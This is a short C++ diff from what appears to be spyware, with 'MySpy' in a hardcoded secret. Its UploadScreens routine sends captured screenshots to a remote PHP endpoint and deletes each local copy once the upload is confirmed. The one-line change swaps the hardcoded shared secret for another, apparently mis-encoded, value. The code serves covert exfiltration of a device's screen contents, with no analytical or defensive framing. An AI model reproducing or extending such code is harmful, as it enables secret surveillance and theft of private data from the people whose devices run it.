@@ -72,7 +72,7 @@ void C_Screenshooter::UploadScreens()
 			fileTempScreen->Close();
 			
 			bufferStringStream.str("");
-			bufferStringStream << "path=" << objBase->psdUsersUserDeviceDataScreens << "/" << file->d_name << "&data=" << curl->Escape(bufferString) << "&random=" << random << "&code=" << hashMD5->Hash(random + "Polciu1MySpy", MD5);
+			bufferStringStream << "path=" << objBase->psdUsersUserDeviceDataScreens << "/" << file->d_name << "&data=" << curl->Escape(bufferString) << "&random=" << random << "&code=" << hashMD5->Hash(random + "has³o", MD5);
 
 			curl->Request(objBase->psfApiSaveScreenPhp, bufferStringStream.str());
 			if(curl->GetSourcePage(0, 1) == "1") remove(pcfScreen.c_str());
